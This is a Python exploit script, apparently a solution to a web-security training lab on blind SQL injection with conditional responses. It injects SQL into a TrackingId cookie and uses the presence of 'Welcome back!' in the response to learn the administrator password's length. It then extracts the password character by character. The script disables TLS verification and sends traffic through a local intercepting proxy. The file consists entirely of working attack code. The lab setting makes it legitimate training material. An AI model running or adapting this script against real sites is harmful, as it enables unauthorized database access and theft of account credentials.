#Lab: Blind SQL injection with conditional responses

import requests
import sys
from requests.api import request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        exploit(url,payload)
    except IndexError:
        print("[-] Usage %s <url> <payload> "%sys.argv[0])
        sys.exit(0)

def exploit(url,payload):

    print("[+] Finding the length of administrator password")
    pass_length=password_length(url,payload)
    if pass_length:
        print("[+] Found the length of administrator password")
        print("[+] Password length : "+str(pass_length))
        password=fetch_password(url,payload,pass_length)
        if password:
            print("[+] Found adminstrator password : "+password)
            sys.exit()


def password_length(url,payload):
    url+='/filter?category=Gifts'
    for i in range(50):
    
        cookies={'TrackingId' : 'DZljmBm3p7nzNy0b'+payload+' and (select \'a\' from users where username=\'administrator\' and length(password)='+str(i)+')=\'a\' --'
        ,'session':'harcU5YDQZAoTZSma5LtkaJCjOWtbJ0g'}
    
        r= requests.get(url,verify=False,proxies=proxies,cookies=cookies)
        if 'Welcome back!' in r.text:
            break
    return i

def fetch_password(url,payload,pass_length):
    pass_chars=['a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                '0','1','2','3','4','5','6','7','8','9'
                ]
    password=''
    url=url+'/filter?category=Gifts'
    for i in range(1,pass_length+1):
          print("[+] Fetching character at position : "+str(i))
          for p in pass_chars:
                cookies={'TrackingId' : 'DZljmBm3p7nzNy0b'+payload+' and (select substring(password,'+str(i)+',1) from users where username=\'administrator\')=\''+p+'\' --','session':'harcU5YDQZAoTZSma5LtkaJCjOWtbJ0g'}
                r=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
                
                if 'Welcome back!' in r.text:
                        print("[+] Character at position "+str(i)+" : "+p)
                        password+=p
                        break
    return password
if __name__=="__main__":
    main()